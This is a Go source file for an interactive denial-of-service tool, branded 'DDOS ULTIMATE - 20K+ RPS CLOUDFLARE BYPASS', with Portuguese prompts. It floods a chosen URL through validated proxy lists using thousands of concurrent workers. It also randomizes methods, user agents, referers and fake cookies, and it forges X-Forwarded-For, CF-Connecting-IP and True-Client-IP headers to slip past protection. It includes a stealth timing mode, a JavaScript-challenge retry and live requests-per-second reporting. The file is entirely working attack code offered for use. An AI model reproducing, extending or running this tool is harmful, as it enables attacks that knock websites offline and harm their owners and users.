package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	ProxyTimeout        = 4 * time.Second
	MaxValidateGo       = 1024
	MinWorkers          = 20
	MaxWorkers          = 300
	ScoreUp             = 8
	ScoreDown           = 15
	ScoreMin            = 0
	ScoreMax            = 500
	ScoreStart          = 80
	ScoreBoostPeriod    = 1 * time.Second
	RecyclePeriod       = 8 * time.Second
	StealthMinDelay     = 5 * time.Millisecond
	StealthMaxDelay     = 50 * time.Millisecond
	GlobalMaxWorkers    = 8000
	ConnectionLifetime  = 30 * time.Second
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
	}
	
	httpMethods = []string{"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"}
	
	referers = []string{
		"https://www.google.com/", "https://www.facebook.com/", "https://twitter.com/",
		"https://www.reddit.com/", "https://www.linkedin.com/", "https://www.instagram.com/",
		"https://www.youtube.com/", "https://www.tiktok.com/", "https://www.pinterest.com/",
		"",
	}
	
	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	}
	
	globalSem = make(chan struct{}, GlobalMaxWorkers)
	transportCache = make(map[string]*http.Transport)
	transportMutex sync.RWMutex
)

type ProxyStatus struct {
	Addr         string
	Score        int
	SuccessCount uint64
	FailCount    uint64
	LastUsed     time.Time
	BypassTier   int
	Transport    *http.Transport
	CookieJar    map[string][]*http.Cookie
	mu           sync.RWMutex
}

type AttackConfig struct {
	Targets        []string
	StealthMode    bool
	MaxRPS         int
	RotateTargets  bool
	BypassLevel    int
	Duration      time.Duration
	JSMode        bool
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func clearScreen() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func printBanner() {
	fmt.Print("\033[31m")
	fmt.Println(`/==============================================\
||                                            ||
|| @@@@@@   @@@  @@@  @@@  @@@@@@@    @@@@@@  ||
||@@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@ ||
||@@!  @@@  @@!  !@@  @@!  @@!  @@@  @@!  @@@ ||
||!@!  @!@  !@!  @!!  !@!  !@!  @!@  !@!  @!@ ||
||@!@!@!@!  @!@@!@!   !!@  @!@!!@!   @!@!@!@! ||
||!!!@!!!!  !!@!!!    !!!  !!@!@!    !!!@!!!! ||
||!!:  !!!  !!: :!!   !!:  !!: :!!   !!:  !!! ||
||:!:  !:!  :!:  !:!  :!:  :!:  !:!  :!:  !:! ||
||::   :::   ::  :::   ::  ::   :::  ::   ::: ||
|| :   : :   :   :::  :     :   : :   :   : : ||
||                                            ||
\==============================================/`)
	fmt.Println("🦹‍♂️ DDOS ULTIMATE - 20K+ RPS CLOUDFLARE BYPASS 🦹‍♂️")
	fmt.Print("\033[0m")
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
}

func getRandomUserAgent() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func getRandomHTTPMethod() string {
	return httpMethods[rand.Intn(len(httpMethods))]
}

func getRandomAcceptHeader() string {
	return acceptHeaders[rand.Intn(len(acceptHeaders))]
}

func getBypassHeaders(tier int) map[string]string {
	headers := map[string]string{}
	ip := generateRandomIP()
	
	switch tier {
	case 0:
		headers["X-Forwarded-For"] = ip
		headers["X-Real-IP"] = ip
		headers["CF-Connecting-IP"] = ip
		headers["X-Forwarded-Host"] = "localhost"
	case 1:
		headers["X-Forwarded-For"] = "127.0.0.1"
		headers["X-Real-IP"] = "127.0.0.1"
		headers["True-Client-IP"] = "127.0.0.1"
	case 2:
		headers["X-Forwarded-For"] = "10.0.0.1"
		headers["X-Real-IP"] = "10.0.0.1"
		headers["True-Client-IP"] = "10.0.0.1"
	default:
		headers["X-Forwarded-For"] = ip
		headers["X-Real-IP"] = ip
		headers["CF-Ray"] = fmt.Sprintf("%x", rand.Int63())
	}
	
	// Headers de segurança modernos
	headers["Sec-Ch-Ua"] = `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`
	headers["Sec-Ch-Ua-Mobile"] = "?0"
	headers["Sec-Ch-Ua-Platform"] = `"Windows"`
	headers["Sec-Fetch-Dest"] = "document"
	headers["Sec-Fetch-Mode"] = "navigate"
	headers["Sec-Fetch-Site"] = "none"
	headers["Sec-Fetch-User"] = "?1"
	
	return headers
}

func getRandomReferer() string {
	return referers[rand.Intn(len(referers))]
}

func generateFakeCookies() string {
	cookies := []string{
		"sessionid=" + randomString(32),
		"csrftoken=" + randomString(32),
		"user_id=" + randomString(16),
		"auth_token=" + randomString(64),
	}
	return strings.Join(cookies, "; ")
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func getCachedTransport(proxyAddr string) *http.Transport {
	transportMutex.RLock()
	if transport, exists := transportCache[proxyAddr]; exists {
		transportMutex.RUnlock()
		return transport
	}
	transportMutex.RUnlock()

	proxyURL, err := url.Parse(proxyAddr)
	var transport *http.Transport
	
	if err != nil || proxyURL == nil {
		transport = &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   ProxyTimeout,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}).DialContext,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				CipherSuites: []uint16{
					tls.TLS_AES_128_GCM_SHA256,
					tls.TLS_AES_256_GCM_SHA384,
					tls.TLS_CHACHA20_POLY1305_SHA256,
				},
			},
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 200,
			IdleConnTimeout:     90 * time.Second,
			ForceAttemptHTTP2:   true,
		}
	} else {
		transport = &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			DialContext: (&net.Dialer{
				Timeout:   ProxyTimeout,
				KeepAlive: 30 * time.Second,
				DualStack: true,
			}).DialContext,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				CipherSuites: []uint16{
					tls.TLS_AES_128_GCM_SHA256,
					tls.TLS_AES_256_GCM_SHA384,
					tls.TLS_CHACHA20_POLY1305_SHA256,
				},
			},
			MaxIdleConns:          1000,
			MaxIdleConnsPerHost:   200,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   3 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
			ForceAttemptHTTP2:     true,
		}
	}

	transportMutex.Lock()
	transportCache[proxyAddr] = transport
	transportMutex.Unlock()
	
	return transport
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func validateProxy(proxyAddr, target string) bool {
	transport := getCachedTransport(proxyAddr)
	
	client := &http.Client{
		Transport: transport,
		Timeout:   ProxyTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false
	}
	
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "*/*")
	
	start := time.Now()
	resp, err := client.Do(req)
	latency := time.Since(start)
	
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	return resp.StatusCode < 500 && latency < (ProxyTimeout/2)
}

func validateAllProxies(proxies []string, target string) []string {
	fmt.Printf("\033[31m🔍 Validando %d proxies contra %s...\033[0m\n", len(proxies), target)
	
	var valid []string
	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, MaxValidateGo)
	
	for _, proxy := range proxies {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			sem <- struct{}{}
			
			if validateProxy(proxy, target) {
				mu.Lock()
				fmt.Printf("\033[32m✅ %s\033[0m\n", proxy)
				valid = append(valid, proxy)
				mu.Unlock()
			} else {
				fmt.Printf("\033[31m❌ %s\033[0m\n", proxy)
			}
			
			<-sem
		}(proxy)
	}
	
	wg.Wait()
	fmt.Printf("\033[33m🎯 Proxies válidas: %d/%d\033[0m\n", len(valid), len(proxies))
	return valid
}

func calculateWorkers(score int) int {
	ratio := float64(score-ScoreMin) / float64(ScoreMax-ScoreMin)
	workers := MinWorkers + int(float64(MaxWorkers-MinWorkers)*math.Pow(ratio, 1.5))
	return workers
}

func stealthDelay() time.Duration {
	min := int64(StealthMinDelay)
	max := int64(StealthMaxDelay)
	return time.Duration(rand.Int63n(max-min) + min)
}

func solveJavascriptChallenge(client *http.Client, target string, ps *ProxyStatus) bool {
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 503 || strings.Contains(resp.Header.Get("Server"), "cloudflare") {
		time.Sleep(2 * time.Second)
		
		retryReq, _ := http.NewRequest("GET", target, nil)
		retryReq.Header.Set("User-Agent", getRandomUserAgent())
		retryReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		retryReq.Header.Set("Cache-Control", "no-cache")
		
		retryResp, err := client.Do(retryReq)
		if err != nil {
			return false
		}
		defer retryResp.Body.Close()
		
		if retryResp.StatusCode < 500 {
			ps.mu.Lock()
			ps.CookieJar[target] = append(ps.CookieJar[target], retryResp.Cookies()...)
			ps.mu.Unlock()
			return true
		}
	}
	
	return resp.StatusCode < 500
}

func showPrompt() {
	fmt.Print("\033[32mtzx@ddos\033[0m:\033[31m~ $\033[0m ")
}

func main() {
	clearScreen()
	printBanner()
	
	reader := bufio.NewReader(os.Stdin)
	
	for {
		showPrompt()
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)
		
		if command == "" {
			continue
		}
		
		args := strings.Fields(command)
		
		switch args[0] {
		case "DDos", "ddos", "attack":
			startAttack(args[1:])
		case "clear", "cls":
			clearScreen()
			printBanner()
		case "exit", "quit":
			fmt.Println("👋 Saindo...")
			return
		case "help", "?":
			showHelp()
		default:
			fmt.Printf("\033[31m❌ Comando não encontrado: %s\033[0m\n", command)
			fmt.Println("Digite 'help' para ver os comandos disponíveis")
		}
	}
}

func showHelp() {
	fmt.Println("\n📖 COMANDOS DISPONÍVEIS:")
	fmt.Println("  DDos [url] [proxies.txt] [segundos] [stealth] [js] - Iniciar ataque")
	fmt.Println("  clear - Limpar tela")
	fmt.Println("  exit - Sair do programa")
	fmt.Println("  help - Mostrar esta ajuda")
	fmt.Println("\n📝 EXEMPLO:")
	fmt.Println("  DDos https://alvo.com proxies.txt 60 stealth js")
	fmt.Println("  DDos https://alvo.com proxies.txt 120")
}

func startAttack(args []string) {
	if len(args) < 3 {
		fmt.Println("\033[31m❌ Uso: DDos [url] [proxies.txt] [segundos] [stealth] [js]\033[0m")
		return
	}
	
	target := args[0]
	proxyFile := args[1]
	durationStr := args[2]
	stealthMode := len(args) > 3 && strings.ToLower(args[3]) == "stealth"
	jsMode := len(args) > 4 && strings.ToLower(args[4]) == "js"
	
	duration, err := strconv.Atoi(durationStr)
	if err != nil || duration < 1 {
		fmt.Println("❌ Duração inválida.")
		return
	}
	
	fmt.Printf("\n🎯 Iniciando configuração do ataque...\n")
	fmt.Printf("🔗 Alvo: %s\n", target)
	fmt.Printf("📁 Proxies: %s\n", proxyFile)
	fmt.Printf("⏰ Duração: %d segundos\n", duration)
	fmt.Printf("🕵️  Modo Stealth: %v\n", stealthMode)
	fmt.Printf("🔄 Modo JavaScript: %v\n", jsMode)
	
	proxies, err := readLines(proxyFile)
	if err != nil || len(proxies) == 0 {
		fmt.Println("❌ Não foi possível ler proxies.")
		return
	}
	
	fmt.Printf("📊 Total de proxies carregadas: %d\n", len(proxies))
	
	proxies = validateAllProxies(proxies, target)
	if len(proxies) == 0 {
		fmt.Println("❌ Nenhuma proxy válida!")
		return
	}
	
	proxyStatus := make([]*ProxyStatus, len(proxies))
	for i, p := range proxies {
		proxyStatus[i] = &ProxyStatus{
			Addr:       p,
			Score:      ScoreStart,
			LastUsed:   time.Now(),
			BypassTier: rand.Intn(4),
			Transport:  getCachedTransport(p),
			CookieJar:  make(map[string][]*http.Cookie),
		}
	}
	
	var totalReqs, totalSuccess, totalFails uint64
	config := &AttackConfig{
		Targets:       []string{target},
		StealthMode:   stealthMode,
		RotateTargets: false,
		BypassLevel:   3,
		Duration:      time.Duration(duration) * time.Second,
		JSMode:        jsMode,
	}
	
	stopTime := time.Now().Add(config.Duration)
	ctx, cancel := context.WithDeadline(context.Background(), stopTime)
	defer cancel()
	
	fmt.Printf("\n🚀 INICIANDO ATAQUE POR %d SEGUNDOS...\n", duration)
	fmt.Println("🔥 HTTP/2 + KEEP-ALIVE + CLOUDFLARE BYPASS ATIVADO")
	fmt.Println("🎯 META: 20K+ RPS CONSTANTES")
	if config.StealthMode {
		fmt.Println("🕵️  MODO STEALTH ATIVADO")
	}
	if config.JSMode {
		fmt.Println("🔄 BYPASS JAVASCRIPT ATIVADO")
	}
	
	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			case <-time.After(ScoreBoostPeriod):
				for _, ps := range proxyStatus {
					ps.mu.Lock()
					if ps.Score > ScoreStart {
						ps.Score = int(math.Max(float64(ScoreStart), float64(ps.Score-2)))
					} else if ps.Score < ScoreStart {
						ps.Score = int(math.Min(float64(ScoreStart), float64(ps.Score+4)))
					}
					ps.mu.Unlock()
				}
			case <-time.After(RecyclePeriod):
				for _, ps := range proxyStatus {
					ps.mu.Lock()
					if time.Since(ps.LastUsed) > 1*time.Minute && ps.Score > ScoreMin {
						ps.Score = int(math.Max(float64(ScoreMin), float64(ps.Score-8)))
					}
					ps.mu.Unlock()
				}
			}
		}
	}()
	
	for _, ps := range proxyStatus {
		go func(ps *ProxyStatus) {
			var currentWorkers int
			workerPool := make(map[int]context.CancelFunc)
			var poolMutex sync.Mutex
			
			for {
				select {
				case <-ctx.Done():
					poolMutex.Lock()
					for _, cancel := range workerPool {
						cancel()
					}
					poolMutex.Unlock()
					return
				default:
					ps.mu.RLock()
					score := ps.Score
					targetIdx := rand.Intn(len(config.Targets))
					currentTarget := config.Targets[targetIdx]
					bypassTier := ps.BypassTier
					transport := ps.Transport
					ps.mu.RUnlock()
					
					desiredWorkers := calculateWorkers(score)
					
					poolMutex.Lock()
					if desiredWorkers != currentWorkers {
						if desiredWorkers > currentWorkers {
							for i := currentWorkers; i < desiredWorkers; i++ {
								workerCtx, cancel := context.WithCancel(ctx)
								workerPool[i] = cancel
								
								go func(workerID int) {
									globalSem <- struct{}{}
									defer func() { <-globalSem }()
									
									client := &http.Client{
										Transport: transport,
										Timeout:   ProxyTimeout,
										CheckRedirect: func(req *http.Request, via []*http.Request) error {
											return http.ErrUseLastResponse
										},
									}
									
									if config.JSMode && rand.Intn(100) < 30 {
										if solveJavascriptChallenge(client, currentTarget, ps) {
											ps.mu.Lock()
											ps.Score += 5
											ps.mu.Unlock()
										}
									}
									
									baseReq, _ := http.NewRequest("GET", currentTarget, nil)
									
									for {
										select {
										case <-workerCtx.Done():
											return
										default:
											ps.mu.Lock()
											ps.LastUsed = time.Now()
											ps.mu.Unlock()
											
											req := baseReq.Clone(context.Background())
											req.Method = getRandomHTTPMethod()
											
											headers := getBypassHeaders(bypassTier)
											for key, value := range headers {
												req.Header.Set(key, value)
											}
											
											req.Header.Set("User-Agent", getRandomUserAgent())
											req.Header.Set("Accept", getRandomAcceptHeader())
											req.Header.Set("Accept-Language", "en-US,en;q=0.5")
											req.Header.Set("Accept-Encoding", "gzip, deflate, br")
											req.Header.Set("Connection", "keep-alive")
											req.Header.Set("Cache-Control", "no-cache")
											req.Header.Set("Pragma", "no-cache")
											req.Header.Set("Referer", getRandomReferer())
											
											if len(ps.CookieJar[currentTarget]) > 0 {
												for _, cookie := range ps.CookieJar[currentTarget] {
													req.AddCookie(cookie)
												}
											} else if rand.Intn(100) < 40 {
												req.Header.Set("Cookie", generateFakeCookies())
											}
											
											resp, err := client.Do(req)
											
											ps.mu.Lock()
											if err == nil && resp != nil {
												if resp.StatusCode < 500 {
													atomic.AddUint64(&totalSuccess, 1)
													atomic.AddUint64(&totalReqs, 1)
													ps.SuccessCount++
													ps.Score += ScoreUp
													if ps.Score > ScoreMax {
														ps.Score = ScoreMax
													}
													
													if len(resp.Cookies()) > 0 {
														ps.CookieJar[currentTarget] = append(ps.CookieJar[currentTarget], resp.Cookies()...)
													}
												} else {
													atomic.AddUint64(&totalFails, 1)
													ps.FailCount++
													ps.Score -= ScoreDown
													if ps.Score < ScoreMin {
														ps.Score = ScoreMin
													}
												}
												resp.Body.Close()
											} else {
												atomic.AddUint64(&totalFails, 1)
												ps.FailCount++
												ps.Score -= ScoreDown
												if ps.Score < ScoreMin {
													ps.Score = ScoreMin
												}
											}
											ps.mu.Unlock()
											
											if config.StealthMode {
												time.Sleep(stealthDelay())
											}
										}
									}
								}(i)
							}
						} else {
							for i := currentWorkers - 1; i >= desiredWorkers; i-- {
								if cancel, exists := workerPool[i]; exists {
									cancel()
									delete(workerPool, i)
								}
							}
						}
						currentWorkers = desiredWorkers
					}
					poolMutex.Unlock()
					
					time.Sleep(500 * time.Millisecond)
				}
			}
		}(ps)
	}
	
	var lastSuccess, lastReqs uint64
	ticker := time.NewTicker(1 * time.Second)
	
	fmt.Println("\n📊 INICIANDO MONITORAMENTO EM TEMPO REAL...")
	
	go func() {
		for range ticker.C {
			currentReqs := atomic.LoadUint64(&totalReqs)
			currentSuccess := atomic.LoadUint64(&totalSuccess)
			
			rps := currentReqs - lastReqs
			successRPS := currentSuccess - lastSuccess
			
			activeProxies := 0
			totalScore := 0
			for _, ps := range proxyStatus {
				ps.mu.RLock()
				if ps.Score > ScoreMin {
					activeProxies++
					totalScore += ps.Score
				}
				ps.mu.RUnlock()
			}
			
			avgScore := 0
			if activeProxies > 0 {
				avgScore = totalScore / activeProxies
			}
			
			successRate := 0.0
			if currentReqs > 0 {
				successRate = float64(currentSuccess) / float64(currentReqs) * 100
			}
			
			remaining := int(time.Until(stopTime).Seconds())
			
			color := "\033[33m"
			if rps > 15000 {
				color = "\033[32m"
			} else if rps > 10000 {
				color = "\033[36m" 
			} else if rps < 5000 {
				color = "\033[31m"
			}
			
			fmt.Printf("\r%s📊 RPS: %d (%d ok) | ✅ Taxa: %.1f%% | 🎯 Proxies: %d/%d | ⭐ Score: %d | ⏰ %ds\033[0m",
				color, rps, successRPS, successRate, activeProxies, len(proxyStatus), avgScore, remaining)
			
			lastReqs = currentReqs
			lastSuccess = currentSuccess
		}
	}()
	
	<-ctx.Done()
	ticker.Stop()
	
	fmt.Printf("\n\n🎉 ATAQUE FINALIZADO!\n")
	
	totalReqsFinal := atomic.LoadUint64(&totalReqs)
	totalSuccessFinal := atomic.LoadUint64(&totalSuccess)
	totalFailsFinal := atomic.LoadUint64(&totalFails)
	
	fmt.Printf("✅ Requisições bem-sucedidas: %d\n", totalSuccessFinal)
	fmt.Printf("❌ Falhas: %d\n", totalFailsFinal)
	
	if totalReqsFinal > 0 {
		successRate := float64(totalSuccessFinal) / float64(totalReqsFinal) * 100
		fmt.Printf("📈 Taxa de sucesso: %.1f%%\n", successRate)
		
		avgRPS := float64(totalReqsFinal) / float64(duration)
		fmt.Printf("⚡ RPS Médio: %.0f\n", avgRPS)
	}
	
	fmt.Println("\n🏆 TOP 15 PROXIES:")
	sort.Slice(proxyStatus, func(i, j int) bool {
		return proxyStatus[i].Score > proxyStatus[j].Score
	})
	
	for i := 0; i < 15 && i < len(proxyStatus); i++ {
		ps := proxyStatus[i]
		ps.mu.RLock()
		successRate := 0.0
		total := ps.SuccessCount + ps.FailCount
		if total > 0 {
			successRate = float64(ps.SuccessCount) / float64(total) * 100
		}
		status := "🟢"
		if successRate < 80 {
			status = "🟡"
		}
		if successRate < 50 {
			status = "🔴"
		}
		fmt.Printf("  %s %d. %s | Score: %d | ✅ %.1f%%\n", status, i+1, ps.Addr, ps.Score, successRate)
		ps.mu.RUnlock()
	}
	
	fmt.Println("\n🔄 Digite 'clear' para reiniciar ou 'exit' para sair")
}
